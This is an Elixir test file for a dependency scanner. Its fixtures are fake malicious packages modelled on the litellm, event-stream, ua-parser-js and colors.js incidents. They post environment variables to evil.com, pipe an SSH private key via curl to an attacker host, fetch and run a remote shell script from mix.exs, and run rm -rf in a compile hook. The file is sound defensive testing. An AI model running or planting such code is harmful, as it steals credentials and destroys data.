defmodule VetCore.Blackhat.SupplyChainAttacksTest do
  @moduledoc """
  Black hat tests simulating real-world supply chain attack patterns.
  Each test creates a fake dependency with attack code and verifies
  the scanner correctly flags it.
  """
  use ExUnit.Case, async: true

  alias VetCore.Checks.{SystemExec, NetworkAccess, EnvAccess, ShadyLinks, CompilerHooks}
  alias VetCore.Types.Dependency

  # ---------------------------------------------------------------------------
  # Helpers
  # ---------------------------------------------------------------------------

  defp setup_dep(dep_name, source_files) do
    tmp_dir = Path.join(System.tmp_dir!(), "vet_blackhat_#{System.unique_integer([:positive])}")
    dep_dir = Path.join([tmp_dir, "deps", to_string(dep_name)])
    lib_dir = Path.join(dep_dir, "lib")
    File.mkdir_p!(lib_dir)

    for {filename, content} <- source_files do
      path =
        if filename == "mix.exs" do
          Path.join(dep_dir, filename)
        else
          File.mkdir_p!(Path.dirname(Path.join(lib_dir, filename)))
          Path.join(lib_dir, filename)
        end

      File.write!(path, content)
    end

    # Write mix.exs if not already provided
    unless Enum.any?(source_files, fn {f, _} -> f == "mix.exs" end) do
      mix_content = """
      defmodule #{Macro.camelize(to_string(dep_name))}.MixProject do
        use Mix.Project
        def project, do: [app: :#{dep_name}, version: "1.0.0"]
      end
      """

      File.write!(Path.join(dep_dir, "mix.exs"), mix_content)
    end

    # Write a mix.lock so VetCore.scan can parse it
    lock = ~s(%{\n  "#{dep_name}": {:hex, :#{dep_name}, "1.0.0", "abc123", [:mix], [], "hexpm", "def456"},\n})
    File.write!(Path.join(tmp_dir, "mix.lock"), lock)

    {tmp_dir, %Dependency{name: dep_name, version: "1.0.0", source: :hex}}
  end

  defp cleanup(tmp_dir) do
    File.rm_rf!(tmp_dir)
  end

  # ---------------------------------------------------------------------------
  # Test: litellm-style attack -- compile-time credential theft
  # ---------------------------------------------------------------------------

  describe "litellm-style attack (compile-time credential theft)" do
    setup do
      source = ~S"""
      defmodule Malicious.LiteLLM do
        @env_dump System.get_env()
        @exfil :httpc.request(:post, {~c"https://evil.com/collect", [], ~c"application/json", inspect(@env_dump)}, [], [])
      end
      """

      {tmp_dir, dep} = setup_dep(:malicious_litellm, [{"malicious.ex", source}])
      on_exit(fn -> cleanup(tmp_dir) end)
      %{project_path: tmp_dir, dep: dep}
    end

    test "detects env_access at compile time", %{project_path: path, dep: dep} do
      findings = EnvAccess.run(dep, path, [])
      assert length(findings) >= 1

      env_dump = Enum.find(findings, &(&1.check_id == :env_access))
      assert env_dump != nil
      assert env_dump.compile_time? == true
      assert env_dump.severity == :critical
    end

    test "detects network_access at compile time", %{project_path: path, dep: dep} do
      findings = NetworkAccess.run(dep, path, [])
      assert length(findings) >= 1

      httpc_finding = Enum.find(findings, &(&1.check_id == :network_access))
      assert httpc_finding != nil
      assert httpc_finding.compile_time? == true
      assert httpc_finding.severity == :critical
    end
  end

  # ---------------------------------------------------------------------------
  # Test: event-stream-style attack -- targeted payload hidden among helpers
  # ---------------------------------------------------------------------------

  describe "event-stream-style attack (targeted payload in dependency)" do
    setup do
      source = ~S"""
      defmodule Malicious.EventStream do
        def process(data), do: data |> transform() |> emit()
        defp transform(data), do: data
        defp emit(data), do: data

        def setup_hooks do
          System.cmd("sh", ["-c", "cat ~/.ssh/id_rsa | curl -X POST -d @- https://evil.attacker.xyz/keys"])
        end
      end
      """

      {tmp_dir, dep} = setup_dep(:malicious_eventstream, [{"event_stream.ex", source}])
      on_exit(fn -> cleanup(tmp_dir) end)
      %{project_path: tmp_dir, dep: dep}
    end

    test "detects system_exec", %{project_path: path, dep: dep} do
      findings = SystemExec.run(dep, path, [])
      assert length(findings) >= 1
      assert Enum.any?(findings, &(&1.check_id == :system_exec))
    end

    test "detects shady_links for .xyz TLD", %{project_path: path, dep: dep} do
      findings = ShadyLinks.run(dep, path, [])
      assert length(findings) >= 1

      xyz_finding =
        Enum.find(findings, fn f ->
          f.check_id == :shady_links and String.contains?(f.description, ".xyz")
        end)

      assert xyz_finding != nil
    end
  end

  # ---------------------------------------------------------------------------
  # Test: ua-parser-js-style attack -- install script in mix.exs project/0
  # ---------------------------------------------------------------------------

  describe "ua-parser-js-style attack (install script in mix.exs)" do
    setup do
      mix_source = ~S"""
      defmodule Malicious.MixProject do
        use Mix.Project

        def project do
          System.cmd("curl", ["-s", "https://evil.ngrok.io/install.sh", "|", "sh"])
          [app: :malicious_uaparser, version: "1.0.0"]
        end
      end
      """

      {tmp_dir, dep} = setup_dep(:malicious_uaparser, [{"mix.exs", mix_source}])
      on_exit(fn -> cleanup(tmp_dir) end)
      %{project_path: tmp_dir, dep: dep}
    end

    test "detects system_exec in mix.exs", %{project_path: path, dep: dep} do
      findings = SystemExec.run(dep, path, [])
      assert length(findings) >= 1

      cmd_finding = Enum.find(findings, &(&1.check_id == :system_exec))
      assert cmd_finding != nil
      # System.cmd is always :critical severity
      assert cmd_finding.severity == :critical
    end

    test "detects shady_links for ngrok.io", %{project_path: path, dep: dep} do
      findings = ShadyLinks.run(dep, path, [])
      assert length(findings) >= 1

      ngrok_finding =
        Enum.find(findings, fn f ->
          f.check_id == :shady_links and String.contains?(f.description, "ngrok")
        end)

      assert ngrok_finding != nil
    end
  end

  # ---------------------------------------------------------------------------
  # Test: colors.js-style attack -- @before_compile with destructive system cmd
  # ---------------------------------------------------------------------------

  describe "colors.js-style attack (@before_compile with destructive cmd)" do
    setup do
      source = ~S"""
      defmodule Malicious.Colors do
        @before_compile __MODULE__

        def __before_compile__(_env) do
          System.cmd("rm", ["-rf", "/tmp/important"])
        end
      end
      """

      {tmp_dir, dep} = setup_dep(:malicious_colors, [{"colors.ex", source}])
      on_exit(fn -> cleanup(tmp_dir) end)
      %{project_path: tmp_dir, dep: dep}
    end

    test "detects @before_compile compiler hook", %{project_path: path, dep: dep} do
      findings = CompilerHooks.run(dep, path, [])
      assert length(findings) >= 1

      hook_finding =
        Enum.find(findings, fn f ->
          f.check_id == :compiler_hooks and String.contains?(f.description, "@before_compile")
        end)

      assert hook_finding != nil
      assert hook_finding.severity == :critical
    end

    test "detects system_exec inside __before_compile__", %{project_path: path, dep: dep} do
      findings = SystemExec.run(dep, path, [])
      assert length(findings) >= 1
      assert Enum.any?(findings, &(&1.check_id == :system_exec))
    end
  end
end
